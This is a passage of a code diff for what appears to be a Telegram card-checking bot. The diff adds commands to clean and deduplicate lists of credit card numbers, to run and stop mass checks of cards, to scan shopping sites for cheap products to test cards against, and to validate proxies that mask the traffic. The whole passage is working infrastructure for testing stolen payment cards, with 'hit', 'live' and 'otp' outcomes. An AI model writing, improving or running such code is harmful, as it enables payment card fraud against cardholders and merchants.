+                tmp_file = await message.reply_to_message.download()
+                async with aiofiles.open(tmp_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = await f.read()
+                lines = content.splitlines()
+            elif message.reply_to_message.text:
+                lines = message.reply_to_message.text.splitlines()
+        elif len(message.command) > 1:
+            lines = ' '.join(message.command[1:]).splitlines()
+
+        if not lines:
+            await message.reply_text(
+                "❌ Reply to a .txt file or text containing CCs.\nExample: 4111111111111111|12|2028|123",
+                disable_web_page_preview=True
+            )
+            return
+
+        cleaned = []
+        seen = set()
+        invalid = 0
+        for line in lines:
+            normalized = parse_cc_from_any_line(line)
+            if not normalized:
+                invalid += 1
+                continue
+            if normalized in seen:
+                continue
+            seen.add(normalized)
+            cleaned.append(normalized)
+
+        if not cleaned:
+            await message.reply_text("❌ No valid CC lines found to clean.", disable_web_page_preview=True)
+            return
+
+        output_file = f"cleaned_ccs_{user.id}_{int(time.time())}.txt"
+        async with aiofiles.open(output_file, 'w') as f:
+            await f.write('\n'.join(cleaned))
+
+        await message.reply_document(
+            output_file,
+            caption=f"✅ Clean complete\nValid: {len(cleaned)}\nInvalid: {invalid}\nDuplicates removed: {max(0, len(lines)-len(cleaned)-invalid)}",
+            disable_web_page_preview=True
+        )
+        os.remove(output_file)
+    finally:
+        if tmp_file and os.path.exists(tmp_file):
+            os.remove(tmp_file)
+
+@app.on_message(filters.command('stopmchk') & filters.private)
+async def stopmchk_command(client, message):
+    """Stop all active mass-check batches for user."""
+    user = message.from_user
+    await save_user(user.id, user.first_name, user.username)
+
+    cancel_info = cancel_user_mchk_batches(user.id)
+    cancelled_batches = cancel_info.get('cancelled_batches', [])
+    removed_pending = cancel_info.get('removed_pending', 0)
+    msg_ids = set(cancel_info.get('msg_ids', []))
+
+    if not cancelled_batches:
+        await message.reply_text("ℹ️ No active mass check to stop.", disable_web_page_preview=True)
+        return
+
+    for msg_id in msg_ids:
+        progress_msg = task_messages.get(msg_id)
+        if not progress_msg:
+            continue
+        stats = task_stats.get(msg_id, {})
+        checked = stats.get('checked', 0)
+        total = stats.get('total', 0)
+        try:
+            await progress_msg.edit_text(
+                f"⛔ MASS CHECK STOPPED\n\nChecked: {checked}/{total}\nPending removed: {removed_pending}",
+                disable_web_page_preview=True
+            )
+        except Exception:
+            pass
+        asyncio.create_task(cleanup_task_data(msg_id, delay=10))
+
+    await message.reply_text(
+        f"✅ Stopped mass check batches: {len(cancelled_batches)}\n"
+        f"🗑️ Removed pending cards: {removed_pending}",
+        disable_web_page_preview=True
+    )
 
 @app.on_message(filters.command('chksite') & filters.private)
 async def chksite_command(client, message):
@@ -1976,38 +3170,59 @@ CREATED BY @still_alivenow"""
         'hit': 0,
         'live': 0,
         'otp': 0,
+        'captcha': 0,
         'failed': 0,
-        'start_time': datetime.now()
+        'start_time': datetime.now(),
+        'last_update_checked': 0,
+        'last_update_at': 0.0,
+        'task_type': 'chksite'
     }
     task_messages[msg_id] = processing_msg
     task_users[msg_id] = user.id
     
-    # Test sites
+    # Test sites with worker pool
     working_sites = []
+    skipped_sites = []
     dead_sites = []
-    
-    for i, site in enumerate(sites):
-        # Update progress
-        is_working, message_text, product_info = await test_site_connection(site, proxy)
-        
-        if is_working:
-            working_sites.append((site, product_info))
-            # Save working site
-            await save_working_site(user.id, site, product_info)
-            hit_status = "hit"
-        else:
-            dead_sites.append((site, message_text))
-            hit_status = "failed"
-        
-        # Update stats
-        task_stats[msg_id]['checked'] = i + 1
-        if hit_status == 'hit':
+    site_check_semaphore = asyncio.Semaphore(SITE_CHECK_WORKERS)
+
+    async def _check_site(site_to_check):
+        try:
+            async with site_check_semaphore:
+                is_working, message_text, product_info = await test_site_connection(site_to_check, proxy)
+
+            if is_working:
+                saved, save_msg = await save_working_site(user.id, site_to_check, product_info)
+                if saved:
+                    return "hit", site_to_check, product_info, None
+                return "skipped", site_to_check, product_info, save_msg
+
+            return "dead", site_to_check, None, message_text
+        except Exception as e:
+            return "dead", site_to_check, None, str(e)
+
+    check_tasks = [asyncio.create_task(_check_site(site)) for site in sites]
+    processed_count = 0
+
+    for done_task in asyncio.as_completed(check_tasks):
+        result_type, checked_site, product_info, detail = await done_task
+        processed_count += 1
+
+        if result_type == "hit":
+            working_sites.append((checked_site, product_info))
             task_stats[msg_id]['hit'] += 1
-        else:
+        elif result_type == "skipped":
+            skipped_sites.append((checked_site, product_info, detail))
             task_stats[msg_id]['failed'] += 1
-        
-        # Update progress message
-        await update_task_progress(msg_id, task_stats[msg_id])
+        else:
+            dead_sites.append((checked_site, detail))
+            task_stats[msg_id]['failed'] += 1
+
+        # Update stats/progress
+        task_stats[msg_id]['checked'] = processed_count
+        is_complete = processed_count >= task_stats[msg_id]['total']
+        if should_update_progress(task_stats[msg_id], force=is_complete):
+            await update_task_progress(msg_id, task_stats[msg_id])
     
     # Create result file
     result_file = f"site_test_{user.id}.txt"
@@ -2017,6 +3232,12 @@ CREATED BY @still_alivenow"""
             await f.write(f"{site}\n")
             await f.write(f"  Price: ${info['price']}\n")
             await f.write(f"  Product: {info['link']}\n\n")
+
+        await f.write("\n=== SKIPPED SITES (PRICE LIMIT) ===\n\n")
+        for site, info, reason in skipped_sites:
+            await f.write(f"{site}\n")
+            await f.write(f"  Price: ${info.get('price', 'N/A')}\n")
+            await f.write(f"  Reason: {reason}\n\n")
         
         await f.write("\n=== DEAD SITES ===\n\n")
         for site, error in dead_sites:
@@ -2026,10 +3247,11 @@ CREATED BY @still_alivenow"""
     summary = f"""✅ Site Test Complete!
 
 📊 Results:
-🟢 Working: {len(working_sites)}
+🟢 Added: {len(working_sites)}
+🟡 Skipped (outside ${MIN_SITE_PRODUCT_PRICE:.2f}-${MAX_SITE_PRODUCT_PRICE:.2f}): {len(skipped_sites)}
 🔴 Dead: {len(dead_sites)}
 
-Working sites have been added to your list.
+Only sites between ${MIN_SITE_PRODUCT_PRICE:.2f} and ${MAX_SITE_PRODUCT_PRICE:.2f} were added.
 Check /showsites to see them."""
     
     await message.reply_document(
@@ -2071,21 +3293,66 @@ async def addproxy_command(client, message):
         )
         return
     
-    # Add proxies
-    added = 0
-    failed = 0
-    for proxy in proxies:
-        if await add_user_proxy(user.id, proxy):
-            added += 1
-        else:
-            failed += 1
-    
-    await message.reply_text(
-        f"✅ Proxies added!\n"
-        f"📊 Added: {added}\n"
-        f"❌ Failed: {failed}",
+    status_msg = await message.reply_text(
+        f"🔄 Validating {len(proxies)} proxies...",
         disable_web_page_preview=True
     )
+
+    normalized_proxies = []
+    invalid_proxies = []
+    seen = set()
+    for proxy in proxies:
+        is_valid, normalized_proxy, reason = validate_proxy_format(proxy)
+        if not is_valid:
+            invalid_proxies.append((proxy, reason))
+            continue
+        if normalized_proxy in seen:
+            continue
+        seen.add(normalized_proxy)
+        normalized_proxies.append(normalized_proxy)
+
+    if not normalized_proxies:
+        await status_msg.edit_text(
+            f"❌ No valid proxies found.\n"
+            f"Invalid format: {len(invalid_proxies)}",
+            disable_web_page_preview=True
+        )
+        return
+
+    semaphore = asyncio.Semaphore(PROXY_VALIDATION_CONCURRENCY)
+
+    async def _validate_one(proxy_value):
+        async with semaphore:
+            ok, reason = await validate_proxy_connection(proxy_value)
+            return proxy_value, ok, reason
+
+    proxy_checks = await asyncio.gather(*[_validate_one(proxy_value) for proxy_value in normalized_proxies])
+
+    added = 0
+    db_failed = 0
+    unreachable = []
+    for proxy_value, ok, reason in proxy_checks:
+        if not ok:
+            unreachable.append((proxy_value, reason))
+            continue
+        if await add_user_proxy(user.id, proxy_value):
+            added += 1
+        else:
+            db_failed += 1
+
+    details = [
+        "✅ Proxy validation complete!",
+        f"📊 Added: {added}",
+        f"❌ Invalid format: {len(invalid_proxies)}",
+        f"❌ Unreachable: {len(unreachable)}",
+        f"❌ DB failed: {db_failed}"
+    ]
+    if invalid_proxies:
+        details.append(f"⚠️ Invalid sample: {invalid_proxies[0][0]} ({invalid_proxies[0][1]})")
+    if unreachable:
+        details.append(f"⚠️ Unreachable sample: {unreachable[0][0]} ({unreachable[0][1]})")
+
+    await status_msg.edit_text("\n".join(details), disable_web_page_preview=True)
 
 @app.on_message(filters.command('delproxy') & filters.private)
 async def delproxy_command(client, message):
@@ -2159,7 +3426,7 @@ async def addsite_command(client, message):
         await processing_msg.edit_text(f"❌ {info[1]}", disable_web_page_preview=True)
         return
     
-    # Save working site
+    # Save working site (only if cheapest product <= price limit)
     success, msg = await save_working_site(user.id, site, info)
     
     if success:
@@ -2190,7 +3457,7 @@ async def showsites_command(client, message):
     user = message.from_user
     
     # Get user's sites
-    user_sites_doc = await user_sites_col.find_one({'user_id': user.id})
+    user_sites_doc = await get_user_sites_doc(user.id)
     
     if not user_sites_doc or 'sites' not in user_sites_doc or not user_sites_doc['sites']:
         await message.reply_text("❌ You don't have any saved sites yet.\nUse /addsite to add working sites first.", disable_web_page_preview=True)
@@ -2254,7 +3521,7 @@ async def rmvsite_command(client, message):
     args = message.text.split()
     
     # Get user's sites first
-    user_sites_doc = await user_sites_col.find_one({'user_id': user.id})
+    user_sites_doc = await get_user_sites_doc(user.id)
     
     if not user_sites_doc or 'sites' not in user_sites_doc or not user_sites_doc['sites']:
         await message.reply_text("❌ You don't have any saved sites yet.\nUse /addsite to add working sites first.", disable_web_page_preview=True)
@@ -2288,10 +3555,11 @@ async def rmvsite_command(client, message):
     
     # Case 1: Remove all sites
     if removal_input == 'all':
-        # Delete all sites immediately
-        result = await user_sites_col.delete_one({'user_id': user.id})
-        
-        if result.deleted_count > 0:
+        sites_list = user_sites_doc.get('sites', [])
+        had_sites = bool(sites_list)
+        await replace_user_sites(user.id, [])
+
+        if had_sites:
             await message.reply_text("✅ All your working sites have been removed successfully!", disable_web_page_preview=True)
         else:
             await message.reply_text("❌ Failed to remove sites or no sites found.", disable_web_page_preview=True)
@@ -2313,12 +3581,10 @@ async def rmvsite_command(client, message):
                 site_url = site_to_remove
             
             # Remove the site
-            result = await user_sites_col.update_one(
-                {'user_id': user.id},
-                {'$pull': {'sites': site_to_remove}}
-            )
-            
-            if result.modified_count > 0:
+            new_sites = [s for idx, s in enumerate(sites_list) if idx != site_number]
+            await replace_user_sites(user.id, new_sites)
+
+            if len(new_sites) != len(sites_list):
                 await message.reply_text(
                     f"✅ Site removed successfully!\n\n"
                     f"Removed: {site_url if isinstance(site_url, str) else 'Unknown'}\n"
@@ -2355,13 +3621,11 @@ async def rmvsite_command(client, message):
         if len(matching_sites) == 1:
             # Single match - remove it directly
             site_to_remove = matching_sites[0]
-            
-            result = await user_sites_col.update_one(
-                {'user_id': user.id},
-                {'$pull': {'sites': site_to_remove}}
-            )
-            
-            if result.modified_count > 0:
+
+            new_sites = [s for s in sites_list if s != site_to_remove]
+            await replace_user_sites(user.id, new_sites)
+
+            if len(new_sites) != len(sites_list):
                 site_name = site_to_remove.get('url', str(site_to_remove)) if isinstance(site_to_remove, dict) else str(site_to_remove)
                 await message.reply_text(f"✅ Site removed: {site_name}", disable_web_page_preview=True)
             else:
@@ -2407,7 +3671,8 @@ async def stats_command(client, message):
 👀 Last Seen: {last_seen}
 🔢 Total Checks: {stats['total_checks']}
 🔌 Proxies: {stats['proxy_count']}
-🌐 Working Sites: {stats['sites_count']}"""
+🌐 Working Sites: {stats['sites_count']}
+⚡ Active Tasks: {stats['active_tasks']} (Queued: {stats['active_queued']} | Processing: {stats['active_processing']})"""
 
     await message.reply_text(stats_text, disable_web_page_preview=True)
 
@@ -2488,8 +3753,7 @@ async def getusersite_command(client, message):
         return
     
     # Get all user sites
-    cursor = user_sites_col.find({})
-    user_sites_list = await cursor.to_list(length=None)
+    user_sites_list = await get_all_user_site_docs()
     
     if not user_sites_list:
         await message.reply_text("❌ No user sites found", disable_web_page_preview=True)
@@ -2604,6 +3868,9 @@ async def main():
     
     # Initialize database
     await init_db()
+
+    # Start fair dispatcher
+    dispatcher_task = asyncio.create_task(fair_task_dispatcher())
     
     # Start workers
     for i in range(WORKER_COUNT):
@@ -2623,6 +3890,10 @@ async def main():
     except KeyboardInterrupt:
         logger.info("Stopping bot...")
     finally:
+        # Stop dispatcher
+        dispatcher_task.cancel()
+        await asyncio.gather(dispatcher_task, return_exceptions=True)
+
         # Stop workers
         for _ in range(WORKER_COUNT):
             await TASK_QUEUE.put(None)
